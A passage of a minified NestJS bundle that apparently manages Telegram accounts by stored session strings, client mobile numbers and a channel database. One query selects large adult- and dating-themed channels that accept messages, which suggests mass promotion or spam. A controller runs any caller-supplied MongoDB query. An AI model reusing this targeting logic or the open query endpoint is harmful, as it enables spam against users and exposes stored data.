Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateBufferClientDto=void 0;const r=o(9742),a=o(7403);class s{}t.CreateBufferClientDto=s,i([(0,r.ApiProperty)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsString)(),n("design:type",String)],s.prototype,"tgId",void 0),i([(0,r.ApiProperty)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsString)(),n("design:type",String)],s.prototype,"mobile",void 0),i([(0,r.ApiProperty)({description:"Date of the session",example:"2023-06-22"}),(0,a.IsString)(),n("design:type",String)],s.prototype,"availableDate",void 0),i([(0,r.ApiProperty)({description:"Session identifier",example:"session123"}),(0,a.IsString)(),n("design:type",String)],s.prototype,"session",void 0),i([(0,r.ApiProperty)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),n("design:type",Number)],s.prototype,"channels",void 0)},2843:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchBufferClientDto=void 0;const r=o(9742),a=o(7403);class s{}t.SearchBufferClientDto=s,i([(0,r.ApiPropertyOptional)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsOptional)(),(0,a.IsString)(),n("design:type",String)],s.prototype,"tgId",void 0),i([(0,r.ApiPropertyOptional)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsOptional)(),(0,a.IsString)(),n("design:type",String)],s.prototype,"mobile",void 0),i([(0,r.ApiPropertyOptional)({description:"availableDate of the bufferClient",example:"2023-06-22"}),(0,a.IsOptional)(),(0,a.IsString)(),n("design:type",String)],s.prototype,"availableDate",void 0),i([(0,r.ApiPropertyOptional)({description:"Session identifier",example:"session123"}),(0,a.IsOptional)(),(0,a.IsString)(),n("design:type",String)],s.prototype,"session",void 0),i([(0,r.ApiPropertyOptional)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),n("design:type",Number)],s.prototype,"channels",void 0)},5042:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateBufferClientDto=void 0;const i=o(9742),n=o(9139);class r extends((0,i.PartialType)(n.CreateBufferClientDto)){}t.UpdateBufferClientDto=r},9035:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientSchema=t.BufferClient=void 0;const r=o(5839);let a=class{};t.BufferClient=a,i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"tgId",void 0),i([(0,r.Prop)({required:!0,unique:!0}),n("design:type",String)],a.prototype,"mobile",void 0),i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"session",void 0),i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"availableDate",void 0),i([(0,r.Prop)({required:!0,type:Number}),n("design:type",Number)],a.prototype,"channels",void 0),t.BufferClient=a=i([(0,r.Schema)({collection:"bufferClients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.BufferClientSchema=r.SchemaFactory.createForClass(a)},4185:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildController=void 0;const a=o(3563),s=o(9742),c=o(4362);let l=class{constructor(e){this.buildService=e}async findOne(){return this.buildService.findOne()}async update(e){return this.buildService.update(e)}};t.BuildController=l,i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get build data"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],l.prototype,"findOne",null),i([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update build"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],l.prototype,"update",null),t.BuildController=l=i([(0,s.ApiTags)("Build"),(0,a.Controller)("builds"),n("design:paramtypes",[c.BuildService])],l)},3177:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildModule=void 0;const n=o(3563),r=o(5839),a=o(4362),s=o(4185),c=o(6877),l=o(889);let p=class{};t.BuildModule=p,t.BuildModule=p=i([(0,n.Global)(),(0,n.Module)({imports:[p,r.MongooseModule.forFeature([{name:"buildModule",collection:"builds",schema:c.BuildSchema}]),l.NpointModule],providers:[a.BuildService],controllers:[s.BuildController],exports:[p]})],p)},4362:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(6954);let p=class{constructor(e,t){this.buildModel=e,this.npointSerive=t}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=await this.buildModel.findOne({}).exec();if(!e)throw new a.NotFoundException("buildModel not found");return e}async update(e){delete e._id;const t=await this.buildModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();try{await this.npointSerive.updateDocument("3375d15db1eece560188",t),console.log("Updated document successfully in npoint")}catch(e){console.log(e)}if(!t)throw new a.NotFoundException("buildModel not found");return t}};t.BuildService=p,t.BuildService=p=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)("buildModule")),n("design:paramtypes",[c.Model,l.NpointService])],p)},6877:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildSchema=t.Build=void 0;const n=o(5839),r=o(6037);let a=class{};t.Build=a,t.Build=a=i([(0,n.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.BuildSchema=n.SchemaFactory.createForClass(a),t.BuildSchema.add({type:r.default.Schema.Types.Mixed})},4288:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsController=void 0;const a=o(3563),s=o(9597),c=o(9742),l=o(6847),p=o(5127),d=o(1734);let u=class{constructor(e){this.channelsService=e}async create(e){return this.channelsService.create(e)}async createMultiple(e){return this.channelsService.createMultiple(e)}search(e){return console.log(e),this.channelsService.search(e)}async findAll(){return this.channelsService.findAll()}async findOne(e){return this.channelsService.findOne(e)}async update(e,t){return this.channelsService.update(e,t)}async remove(e){return this.channelsService.remove(e)}};t.ChannelsController=u,i([(0,a.Post)(),(0,c.ApiOperation)({summary:"Create a new  channel"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[p.CreateChannelDto]),n("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Post)("createMultiple"),(0,c.ApiOperation)({summary:"Create multiple channels"}),(0,c.ApiBody)({type:[p.CreateChannelDto]}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Array]),n("design:returntype",Promise)],u.prototype,"createMultiple",null),i([(0,a.Get)("search"),(0,c.ApiOperation)({summary:"Search channels by filters"}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[l.SearchChannelDto]),n("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,c.ApiOperation)({summary:"Get all  channels"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)(":channelId"),(0,c.ApiOperation)({summary:"Get an  channel by channelId"}),r(0,(0,a.Param)("channelId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":channelId"),(0,c.ApiOperation)({summary:"Update an  channel by channelId"}),r(0,(0,a.Param)("channelId")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.UpdateChannelDto]),n("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":channelId"),(0,c.ApiOperation)({summary:"Delete an  channel by channelId"}),r(0,(0,a.Param)("channelId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"remove",null),t.ChannelsController=u=i([(0,c.ApiTags)("Channels"),(0,a.Controller)("channels"),n("design:paramtypes",[s.ChannelsService])],u)},1324:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsModule=void 0;const n=o(3563),r=o(5839),a=o(9597),s=o(4288),c=o(8029),l=o(5774);let p=class{};t.ChannelsModule=p,t.ChannelsModule=p=i([(0,n.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:c.Channel.name,schema:c.ChannelSchema}])],controllers:[s.ChannelsController],providers:[a.ChannelsService],exports:[a.ChannelsService]})],p)},9597:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(8029);let p=class{constructor(e){this.ChannelModel=e,console.log(l.Channel.name)}async create(e){return new this.ChannelModel(e).save()}async createMultiple(e){const t=e.map((e=>({updateOne:{filter:{channelId:e.channelId},update:{$set:e},upsert:!0}})));return await this.ChannelModel.bulkWrite(t,{ordered:!1}),"Channels Saved"}async findAll(){return this.ChannelModel.find().exec()}async findOne(e){const t=(await this.ChannelModel.findOne({channelId:e}).exec())?.toJSON();return t}async update(e,t){return await this.ChannelModel.findOneAndUpdate({channelId:e},{$set:t},{new:!0,upsert:!0}).exec()}async remove(e){await this.ChannelModel.findOneAndDelete({channelId:e}).exec()}async search(e){return console.log(e),this.ChannelModel.find(e).exec()}async getChannels(e=50,t=0,o=[],i=[]){const n=new RegExp(o.join("|"),"i"),r=new RegExp("online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser","i");let a={$and:[{username:{$ne:null}},{$or:[{title:{$regex:n}},{username:{$regex:n}}]},{username:{$not:{$regex:"^("+i.map((e=>"(?i)"+e?.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")))?.join("|")+")$"}}},{title:{$not:{$regex:r}}},{username:{$not:{$regex:r}}},{sendMessages:!1,broadcast:!1,restricted:!1}]};const s={participantsCount:"desc"};try{return await this.ChannelModel.find(a).sort(s).skip(t).limit(e).exec()}catch(e){return console.error("Error:",e),[]}}async executeQuery(e,t,o){try{if(!e)throw new a.BadRequestException("Query is invalid.");const i=this.ChannelModel.find(e);return t&&i.sort(t),o&&i.limit(o),await i.exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}async getActiveChannels(e=50,t=0,o=[]){const i={$and:[{$or:[{title:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}},{username:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}}]},{$or:[{title:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}},{username:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}}]},{channelId:{$nin:o},participantsCount:{$gt:1e3},username:{$ne:null},canSendMsgs:!0,restricted:!1,forbidden:!1}]},n=(o.length,{participantsCount:-1});try{return await this.ChannelModel.aggregate([{$match:i},{$skip:t},{$limit:e},{$addFields:{randomField:{$rand:{}}}},{$sort:n},{$project:{randomField:0}}]).exec()}catch(e){return console.error("Error:",e),[]}}};t.ChannelsService=p,t.ChannelsService=p=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)(l.Channel.name)),n("design:paramtypes",[c.Model])],p)},5127:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateChannelDto=void 0;const r=o(9742);class a{constructor(){this.private=!1,this.forbidden=!1}}t.CreateChannelDto=a,i([(0,r.ApiProperty)({description:"Unique identifier for the channel",example:"803387987"}),n("design:type",String)],a.prototype,"channelId",void 0),i([(0,r.ApiProperty)({description:"Whether the channel is a broadcast channel",example:null,required:!1}),n("design:type",Boolean)],a.prototype,"broadcast",void 0),i([(0,r.ApiProperty)({description:"Indicates if the channel can send messages",example:!0}),n("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),i([(0,r.ApiProperty)({description:"Whether the channel is a megagroup",example:null,required:!1}),n("design:type",Boolean)],a.prototype,"megagroup",void 0),i([(0,r.ApiProperty)({description:"Number of participants in the channel",example:0}),n("design:type",Number)],a.prototype,"participantsCount",void 0),i([(0,r.ApiProperty)({description:"Whether the channel is restricted",example:null,required:!1}),n("design:type",Boolean)],a.prototype,"restricted",void 0),i([(0,r.ApiProperty)({description:"Whether the channel can send messages",example:null,required:!1}),n("design:type",Boolean)],a.prototype,"sendMessages",void 0),i([(0,r.ApiProperty)({description:"Title of the channel",example:"Earn money with Ayesha"}),n("design:type",String)],a.prototype,"title",void 0),i([(0,r.ApiProperty)({description:"Username of the channel",example:null,required:!1}),n("design:type",String)],a.prototype,"username",void 0),i([(0,r.ApiProperty)({description:"Whether the channel is private",example:!1,required:!1}),n("design:type",Boolean)],a.prototype,"private",void 0),i([(0,r.ApiProperty)({default:!1,example:!1,required:!1}),n("design:type",Boolean)],a.prototype,"forbidden",void 0)},6847:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchChannelDto=void 0;const r=o(9742);class a{}t.SearchChannelDto=a,i([(0,r.ApiPropertyOptional)({description:"Unique identifier for the channel",example:"803387987"}),n("design:type",String)],a.prototype,"channelId",void 0),i([(0,r.ApiPropertyOptional)({description:"Title of the channel",example:"Earn money with Ayesha"}),n("design:type",String)],a.prototype,"title",void 0),i([(0,r.ApiPropertyOptional)({description:"privacy of the channel",example:!1}),n("design:type",String)],a.prototype,"private",void 0),i([(0,r.ApiPropertyOptional)({description:"Username of the channel",example:"ayesha_channel"}),n("design:type",String)],a.prototype,"username",void 0),i([(0,r.ApiPropertyOptional)({description:"Indicates if the channel can send messages",example:!0}),n("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),i([(0,r.ApiPropertyOptional)({description:"Minimum number of participants in the channel",example:10}),n("design:type",Number)],a.prototype,"minParticipantsCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Maximum number of participants in the channel",example:100}),n("design:type",Number)],a.prototype,"maxParticipantsCount",void 0)},1734:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateChannelDto=void 0;const i=o(9742),n=o(5127);class r extends((0,i.PartialType)(n.CreateChannelDto)){}t.UpdateChannelDto=r},8029:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelSchema=t.Channel=void 0;const r=o(5839),a=o(6037);let s=class{};t.Channel=s,i([(0,r.Prop)({required:!0,unique:!0}),n("design:type",String)],s.prototype,"channelId",void 0),i([(0,r.Prop)({default:!1}),n("design:type",Boolean)],s.prototype,"broadcast",void 0),i([(0,r.Prop)({default:!0}),n("design:type",Boolean)],s.prototype,"canSendMsgs",void 0),i([(0,r.Prop)({type:a.Schema.Types.Number,default:0}),n("design:type",Number)],s.prototype,"participantsCount",void 0),i([(0,r.Prop)({default:!1}),n("design:type",Boolean)],s.prototype,"restricted",void 0),i([(0,r.Prop)({default:!1}),n("design:type",Boolean)],s.prototype,"sendMessages",void 0),i([(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"title",void 0),i([(0,r.Prop)({required:!1,default:null}),n("design:type",String)],s.prototype,"username",void 0),i([(0,r.Prop)({required:!0,default:!1}),n("design:type",Boolean)],s.prototype,"private",void 0),i([(0,r.Prop)({default:!1,required:!1}),n("design:type",Boolean)],s.prototype,"forbidden",void 0),t.Channel=s=i([(0,r.Schema)({collection:"channels",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.ChannelSchema=r.SchemaFactory.createForClass(s)},3209:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientController=void 0;const a=o(3563),s=o(9742),c=o(5562),l=o(9815),p=o(1167),d=o(7908);let u=class{constructor(e){this.clientService=e}async create(e){try{return await this.clientService.create(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async search(e){try{return await this.clientService.search(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async updateClient(e){return this.clientService.updateClient(e)}async findAllMasked(e){try{return await this.clientService.findAllMasked(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async findAll(){try{return await this.clientService.findAll()}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async findOne(e){try{return await this.clientService.findOne(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async update(e,t){try{return await this.clientService.update(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async remove(e){try{return await this.clientService.remove(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async executeQuery(e){const{query:t,sort:o,limit:i,skip:n}=e;try{return await this.clientService.executeQuery(t,o,i,n)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async addPromoteMobile(e,t){try{return await this.clientService.addPromoteMobile(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async removePromoteMobile(e,t){try{return await this.clientService.removePromoteMobile(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}};t.ClientController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),(0,s.ApiResponse)({status:201,description:"The user data has been successfully created."}),(0,s.ApiResponse)({status:400,description:"Invalid input data."}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[l.CreateClientDto]),n("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),(0,s.ApiResponse)({status:200,description:"Matching user data returned successfully."}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[p.SearchClientDto]),n("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)("updateClient/:clientId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("clientId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"updateClient",null),i([(0,a.Get)("maskedCls"),(0,s.ApiOperation)({summary:"Get all user data with masked fields"}),(0,s.ApiResponse)({status:200,description:"All user data returned successfully."}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[p.SearchClientDto]),n("design:returntype",Promise)],u.prototype,"findAllMasked",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),(0,s.ApiResponse)({status:200,description:"All user data returned successfully."}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)(":clientId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),(0,s.ApiResponse)({status:200,description:"User data returned successfully."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),r(0,(0,a.Param)("clientId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":clientId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),(0,s.ApiResponse)({status:200,description:"The user data has been successfully updated."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),r(0,(0,a.Param)("clientId")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.UpdateClientDto]),n("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":clientId"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),(0,s.ApiResponse)({status:200,description:"The user data has been successfully deleted."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),r(0,(0,a.Param)("clientId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiResponse)({status:200,description:"Query executed successfully."}),(0,s.ApiResponse)({status:400,description:"Invalid query."}),(0,s.ApiBody)({schema:{properties:{query:{type:"object"},sort:{type:"object"},limit:{type:"number"},skip:{type:"number"}}}}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"executeQuery",null),i([(0,a.Patch)(":clientId/promoteMobile/add"),(0,s.ApiOperation)({summary:"Add a mobile number to the promoteMobile array for a specific client"}),(0,s.ApiParam)({name:"clientId",description:"The unique identifier of the client"}),(0,s.ApiBody)({schema:{properties:{mobileNumber:{type:"string",example:"916265240911"}}}}),(0,s.ApiResponse)({status:200,description:"Mobile number added successfully."}),(0,s.ApiResponse)({status:404,description:"Client not found."}),r(0,(0,a.Param)("clientId")),r(1,(0,a.Body)("mobileNumber")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"addPromoteMobile",null),i([(0,a.Patch)(":clientId/promoteMobile/remove"),(0,s.ApiOperation)({summary:"Remove a mobile number from the promoteMobile array for a specific client"}),(0,s.ApiParam)({name:"clientId",description:"The unique identifier of the client"}),(0,s.ApiBody)({schema:{properties:{mobileNumber:{type:"string",example:"916265240911"}}}}),(0,s.ApiResponse)({status:200,description:"Mobile number removed successfully."}),(0,s.ApiResponse)({status:404,description:"Client not found."}),r(0,(0,a.Param)("clientId")),r(1,(0,a.Body)("mobileNumber")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"removePromoteMobile",null),t.ClientController=u=i([(0,s.ApiTags)("Clients"),(0,a.Controller)("clients"),n("design:paramtypes",[c.ClientService])],u)},8009:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var 